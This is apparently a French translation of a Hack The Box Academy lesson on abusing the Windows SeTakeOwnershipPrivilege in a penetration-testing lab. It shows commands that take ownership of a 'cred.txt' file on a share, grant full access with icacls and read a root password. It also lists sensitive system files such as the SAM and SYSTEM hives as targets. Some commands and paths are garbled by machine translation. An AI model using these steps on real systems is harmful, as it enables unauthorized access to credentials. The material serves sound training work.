SeTakeOwnershipPrivilege
========================

* * * * *

[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) accorde à un utilisateur le capacité à s'approprier n'importe quel « objet sécurisable », c'est-à-dire les objets Active Directory, les fichiers/dossiers NTFS, les imprimantes, les clés de registre, les services et les processus. Ce privilège attribue des droits [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) sur un objet, ce qui signifie que l'utilisateur peut modifier le propriétaire dans le descripteur de sécurité de l'objet. . Les administrateurs reçoivent ce privilège par défaut. Bien qu'il soit rare de rencontrer un compte d'utilisateur standard avec ce privilège, nous pouvons rencontrer un compte de service qui, par exemple, est chargé d'exécuter des tâches de sauvegarde et des instantanés VSS auxquels ce privilège est attribué. Quelques autres peuvent également lui être attribués, tels que `SeBackupPrivilege`, `SeRestorePrivilege` et `SeSecurityPrivilege` pour contrôler les privilèges de ce compte à un niveau plus précis et ne pas accorder au compte tous les droits d'administrateur local. Ces privilèges à eux seuls pourraient probablement être utilisés pour augmenter les privilèges. Néanmoins, il peut arriver que nous devions nous approprier des fichiers spécifiques car d'autres méthodes sont bloquées ou ne fonctionnent pas comme prévu. Abuser de ce privilège est un peu un cas limite. Pourtant, cela vaut la peine de comprendre en profondeur, d'autant plus que nous pouvons également nous retrouver dans un scénario dans un environnement Active Directory où nous pouvons attribuer ce droit à un utilisateur spécifique que nous pouvons contrôler et en tirer parti pour lire un fichier sensible sur un fichier partager.

![image](https://academy.hackthebox.com/storage/modules/67/change_owner.png)

Le paramètre peut être défini dans la stratégie de groupe sous :

- `Configuration de l'ordinateur` ⇾ `Paramètres Windows` ⇾ `Paramètres de sécurité` ⇾ `Politiques locales` ⇾ `Attribution des droits d'utilisateur`

![image](https://academy.hackthebox.com/storage/modules/67/setakeowner2.png)

Avec ce privilège, un utilisateur peut s'approprier n'importe quel fichier ou objet et apporter des modifications pouvant impliquer l'accès à des données sensibles, `Exécution de code à distance` (`RCE`) ou `Denial-of-Service` (DOS).

Supposons que nous rencontrions un utilisateur avec ce privilège ou que nous le lui attribuions par le biais d'une attaque telle qu'un abus d'objet de stratégie de groupe à l'aide de [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse). Dans ce cas, nous pourrions utiliser ce privilège pour potentiellement prendre le contrôle d'un dossier partagé ou de fichiers sensibles tels qu'un document contenant des mots de passe ou une clé SSH.

* * * * *

Tirer parti du privilège
------------------------

#### Examen des privilèges utilisateur actuels

Passons en revue les privilèges de notre utilisateur actuel.

Examen des privilèges d'utilisateur actuels

```
PS C:\htb> whoami /priv

INFORMATIONS SUR LES PRIVILÈGES
----------------------

Nom du privilège Description État
================================================= ================================= ========
SeTakeOwnershipPrivilege S'approprier des fichiers ou d'autres objets Désactivé
SeChangeNotifyPrivilege Bypass traverse la vérification activée
SeIncreaseWorkingSetPrivilege Augmenter un ensemble de travail de processus Désactivé

```

#### Activation de SeTakeOwnershipPrivilege

Notez dans la sortie que le privilège n'est pas activé. Nous pouvons l'activer à l'aide de ce [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) qui est détaillé dans [ceci](https://www.leeholmes.com/blog/ 2010/09/24/adjusting-token-privileges-in-powershell/) article de blog, ainsi que [ceci](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) un qui s'appuie sur le concept initial.

Activation de SeTakeOwnershipPrivilege

```
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

INFORMATIONS SUR LES PRIVILÈGES
----------------------
Nom du privilège Description État
================================================= =================== =======
SeTakeOwnershipPrivilege S'approprier des fichiers ou d'autres objets Activé
SeChangeNotifyPrivilege Bypass traverse la vérification activée
SeIncreaseWorkingSetPrivilege Augmenter un ensemble de travail de processus Activé

```

#### Choix d'un fichier cible

Ensuite, choisissez un fichier cible et confirmez la propriété actuelle. Pour nos besoins, nous allons cibler un fichier intéressant trouvé sur un partage de fichiers. Il est courant de rencontrer des partages de fichiers avec des répertoires `Public` et `Privé` avec des sous-répertoires configurés par service. Compte tenu du rôle d'un utilisateur dans l'entreprise, il peut souvent accéder à des fichiers/répertoires spécifiques. Même avec une structure comme celle-ci, un administrateur système peut mal configurer les autorisations sur les répertoires et les sous-répertoires, faisant des partages de fichiers une riche source d'informations pour nous une fois que nous avons obtenu les informations d'identification Active Directory (et parfois même sans avoir besoin d'informations d'identification). Pour notre scénario, supposons que wNous avons accès au partage de fichiers de l'entreprise cible et pouvons parcourir librement les sous-répertoires `Privé` et `Public` . Dans la plupart des cas, nous constatons que les autorisations sont définies de manière stricte et nous n'avons trouvé aucune information intéressante sur la partie "Public" du partage de fichiers. En parcourant la partie `Privé` , nous constatons que tous les utilisateurs du domaine peuvent répertorier le contenu de certains sous-répertoires, mais reçoivent un message `Accès refusé` lorsqu'ils essaient de lire le contenu de la plupart des fichiers. Nous trouvons un fichier nommé `cred.txt` sous le sous-répertoire `IT` du dossier de partage `Private` lors de notre énumération.

Étant donné que notre compte d'utilisateur a `SeTakeOwnershipPrivilege` (qui a peut-être déjà été accordé), ou que nous exploitons une autre mauvaise configuration, comme un objet de stratégie de groupe (GPO) trop permissif pour accorder ce privilège à notre compte d'utilisateur), nous pouvons en tirer parti pour lire tout fichier de notre choix.

Remarque : Faites très attention lorsque vous effectuez une action potentiellement destructrice, telle que le changement de propriété d'un fichier, car cela pourrait entraîner l'arrêt d'une application ou perturber le ou les utilisateurs de l'objet cible. Changer la propriété d'un fichier important, tel qu'un fichier web.config en direct, n'est pas quelque chose que nous ferions sans le consentement préalable de notre client. De plus, changer la propriété d'un fichier enfoui dans plusieurs sous-répertoires (tout en modifiant l'autorisation de chaque sous-répertoire au fur et à mesure) peut être difficile à annuler et doit être évité.

Examinons notre fichier cible pour recueillir un peu plus d'informations à son sujet.

Choisir un fichier cible

```
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Sélectionnez Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

Propriétaire des attributs FullName LastWriteTime
-------- ------------- ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM Archive

```

#### Vérification de la propriété du fichier

Nous pouvons voir que le propriétaire n'est pas affiché, ce qui signifie que nous n'avons probablement pas suffisamment d'autorisations sur l'objet pour afficher ces détails. Nous pouvons sauvegarder un peu et vérifier le propriétaire du répertoire informatique.

Vérification de la propriété du fichier

```
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'

  Le volume du lecteur C n'a pas d'étiquette.
  Le numéro de série du volume est 0C92-675B

  Répertoire de C:\Department Shares\Private\IT

18/06/2021 12:22 PM <DIR> WINLPE-SRV01\sccm_svc .
18/06/2021 12:22 PM <DIR> WINLPE-SRV01\sccm_svc ..
18/06/2021 12:23 36 ... cred.txt
                1 Fichier(s) 36 octets
                2 Dir(s) 17 079 754 752 octets libres

```

Nous pouvons voir que le partage informatique semble appartenir à un compte de service et contient un fichier `cred.txt` contenant des données.

#### Prendre possession du fichier

Nous pouvons maintenant utiliser le binaire Windows [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows pour modifier le propriétaire du fichier.

Prendre possession du dossier

```
PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'

SUCCÈS : Le fichier (ou dossier) : "C:\Department Shares\Private\IT\cred.txt" appartient désormais à l'utilisateur "WINLPE-SRV01\htb-student".

```

#### Confirmation du changement de propriétaire

Nous pouvons confirmer la propriété en utilisant la même commande qu'avant. Nous voyons maintenant que notre compte d'utilisateur est le propriétaire du fichier.

Confirmation du changement de propriétaire

```
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

Propriétaire du répertoire de noms
---- --------- -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student

```

#### Modification de l'ACL du fichier

Il se peut que nous ne puissions toujours pas lire le fichier et que nous devions modifier l'ACL du fichier à l'aide de `icacls` pour pouvoir le lire.

Modification de l'ACL du fichier

```
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

cat : L'accès au chemin 'C:\Department Shares\Private\IT\cred.txt' est refusé.
A la ligne:1 car:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     + CategoryInfo : PermissionDenied : (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
    horizedAccessExceptionhorizedAccessExceptionhorizedAccessException
     + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand

```

Accordons à notre utilisateur tous les privilèges sur le fichier cible.

Modification de l'ACL du fichier

```
PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

fichier traité : C:\Department Shares\Private\IT\cred.txt
Traitement réussi de 1 fichiers ; Échec du traitement de 0 fichiers

```

#### Lecture du fichier

Si tout s'est déroulé comme prévu, nous pouvons maintenant lire le fichier cible à partir de la ligne de commande, l'ouvrir si nous avons un accès RDP ou le copier dans notre système d'attaque pour un traitement supplémentaire (comme déchiffrer le mot de passe d'une base de données KeePass.

Lecture du fichier

```
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

Administrateur NIX01

racine : n1X_p0wer_us3er !

```

Après avoir effectué ces modifications, nous voudrions faire tout notre possible pour rétablir les autorisations/propriété du fichier. Si nous ne pouvons pas pour une raison quelconque, nous devons alerter notre client et documenter soigneusement les modifications dans une annexe de notre livrable de rapport. Encore une fois, tirer parti de cette autorisation peut être considéré comme une action destructrice et doit être fait avec beaucoup de soin. Certains clients peuvent préférer que nous documentions la capacité d'effectuer l'action comme preuve d'une mauvaise configuration, mais ne profitons pas pleinement de la faille en raison de l'impact potentiel.

* * * * *

Quand utiliser?
------------

#### Fichiers d'intérêt

Certains fichiers locaux intéressants peuvent inclure :

Fichiers d'intérêt

```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\réparation\système
%WINDIR%\réparation\logiciel, %WINDIR%\réparation\sécurité
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav

```

Nous pouvons également rencontrer `.kdbx` des fichiers de base de données KeePass, des blocs-notes OneNote, des fichiers tels que `passwords.*`, `pass.*`, `creds.*`, des scripts, d'autres fichiers de configuration, des fichiers de disque dur virtuel, etc. que nous pouvons cibler pour extraire des informations sensibles afin d'élever nos privilèges et d'améliorer notre accès.